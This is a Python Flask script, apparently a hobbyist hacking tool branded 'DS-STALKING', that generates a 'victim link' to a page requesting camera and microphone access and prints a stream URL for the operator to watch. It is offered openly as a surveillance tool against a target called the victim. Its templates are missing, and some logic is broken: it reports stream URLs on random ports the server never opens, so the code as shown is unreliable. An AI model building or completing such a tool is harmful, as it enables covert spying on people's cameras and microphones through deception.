from flask import Flask, render_template, request, jsonify
import socket
import random
import pyfiglet
import threading
import os

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Création de l'application Flask
app = Flask(__name__)

# Stockage global pour le lien de flux généré
generated_stream_url = None

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Générer un port aléatoire
def get_random_port():
    return random.randint(5000, 65535)

# Route pour la page principale (affichage du lien à envoyer à la victime)
@app.route("/")
def index():
    return render_template("index.html")

# Route pour générer le lien à envoyer à la victime
@app.route("/generate_victim_link", methods=["POST"])
def generate_victim_link():
    input_link = request.form['input_link']
    local_ip = get_local_ip()
    port = get_random_port()
    # Générer un lien unique pour la victime
    victim_link = f"http://{local_ip}:{port}/victim_permission"
    return render_template("generated_link.html", victim_link=victim_link)

# Route pour la page de demande d'autorisation de la caméra et du micro
@app.route("/victim_permission")
def victim_permission():
    return render_template("victim_permission.html")

# Route pour démarrer le flux après l'autorisation de la victime
@app.route("/start_stream", methods=["POST"])
def start_stream():
    global generated_stream_url
    local_ip = get_local_ip()
    port = get_random_port()
    
    # Lien du flux généré
    stream_url = f"http://{local_ip}:{port}/stream"
    generated_stream_url = stream_url  # Stocke le lien côté serveur
    
    # Affiche le lien dans le terminal
    print(f"[INFO] Nouveau lien de flux pour toi : {stream_url}")
    
    # Message de confirmation pour la victime
    return jsonify({"message": "Flux démarré. Merci d'accorder les autorisations !"})

# Route pour afficher le flux vidéo et audio
@app.route("/stream")
def stream():
    # Ici, vous pouvez afficher un flux vidéo/audio
    return render_template("stream.html")

# Route pour récupérer le lien de flux généré (utile pour toi)
@app.route("/get_stream_url")
def get_stream_url():
    global generated_stream_url
    if generated_stream_url:
        return jsonify({"stream_url": generated_stream_url})
    else:
        return jsonify({"error": "Aucun flux n'est disponible pour le moment."})

if __name__ == "__main__":
    local_ip = get_local_ip()
    port = get_random_port()  # Génère un port aléatoire à chaque exécution
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
    app.run(host="0.0.0.0", port=port)  # Utilise le port généré aléatoirement